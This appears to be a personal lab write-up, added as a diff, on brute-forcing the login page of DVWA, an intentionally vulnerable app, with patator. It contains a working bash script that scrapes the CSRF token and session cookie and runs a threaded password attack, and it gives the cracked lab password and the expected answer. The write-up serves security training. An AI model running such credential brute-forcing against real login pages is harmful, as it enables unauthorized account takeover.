@@ -1,0 +1,37 @@
+using patator to brute force a login page.
+
+if used burp suite intruder or hydra, the response code & length are the save for correct/incorrect creds. 
+
+so we use patator as it allows to filter results following a specific pattern.
+
+in this case, we are aware that the response for a succefull attempt cotain index.php and other does not
+
+so we will only the response containing index.php, we get the password which is "1qaz@WSX"
+
+script ----->
+
+IP=10.10.221.124
+
+CSRF=$(curl -s -c dvwa.cookie "${IP}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
+
+SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
+
+echo "The CSRF is: $CSRF"
+
+echo "The PHPSESSID is: $SESSIONID"
+
+patator http_fuzz method=POST --threads=64 timeout=10 \
+url="http://${IP}/login.php" \
+0=passwords-1628441697834.txt \
+body="username=admin&password=FILE0&Login=Login&user_token=${CSRF}" \
+header="Cookie: PHPSESSID=${SESSIONID}; security=impossible" \
+-x ignore:fgrep!=index.php
+
+
+I have used the above but the expected for question is :
+
+-x ignore:fgrep=location: login.php
+
+mine ignore if it does not find index.php
+
+the expected one ignore when it finds login.php
